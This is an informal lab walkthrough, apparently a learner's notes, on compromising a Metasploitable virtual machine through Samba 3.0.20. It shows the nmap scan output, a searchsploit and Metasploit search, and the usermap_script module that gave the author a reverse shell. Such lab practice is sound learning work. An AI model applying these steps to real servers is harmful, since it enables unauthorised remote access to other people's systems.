first of all i had 2 of them in samba
139/tcp  open  netbios-ssn Samba smbd 3.X - 4.X (workgroup: WORKGROUP)
445/tcp  open  netbios-ssn Samba smbd 3.X - 4.X (workgroup: WORKGROUP)

so i did **nmap -sC 192.168.177.128 -p 139,445 **
Host script results:
| smb-os-discovery: 
|   OS: Unix (Samba 3.0.20-Debian)
|   Computer name: metasploitable
|   NetBIOS computer name: 
|   Domain name: localdomain
|   FQDN: metasploitable.localdomain
|_  System time: 2024-12-24T01:10:47-05:00

so for that i searched in **searchsploit** and in metasploit
in searchsploit i got some and in metasploit 
**search Samba -v 3.0.20**
so i got only 1 and then setting the options in to it and then also assigned the parameters and then did **exploit**
then i got the reverse shell
exploit used: 
**exploit/multi/samba/usermap_script  2007-05-14 excellent  No Samba "username map script" Command Execution**
